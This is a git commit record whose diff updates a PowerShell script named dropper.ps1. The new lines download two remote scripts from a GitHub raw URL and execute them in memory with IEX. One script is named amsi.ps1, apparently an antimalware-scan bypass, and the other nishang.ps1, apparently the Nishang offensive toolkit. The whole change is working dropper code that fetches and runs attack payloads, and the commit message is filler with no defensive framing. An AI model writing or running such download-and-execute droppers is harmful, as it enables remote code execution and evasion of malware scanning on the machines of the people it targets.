bbe32cf2080c092aacc0a77fb3b85d1ecb9e5a4a
isap <63068320+IsaPeter@users.noreply.github.com>
2024-10-03 10:16:57 +0200

    Update dropper.ps1
    sdfsdfd

--- dropper.ps1
+++ dropper.ps1
@@ -1,2 +1,2 @@
-(new-object system.net.webclient).downloadstring("") | IEX
-(new-object system.net.webclient).downloadstring("") | IEX
+(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/IsaPeter/test1/refs/heads/master/amsi.ps1") | IEX
+(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/IsaPeter/test1/refs/heads/master/nishang.ps1") | IEX
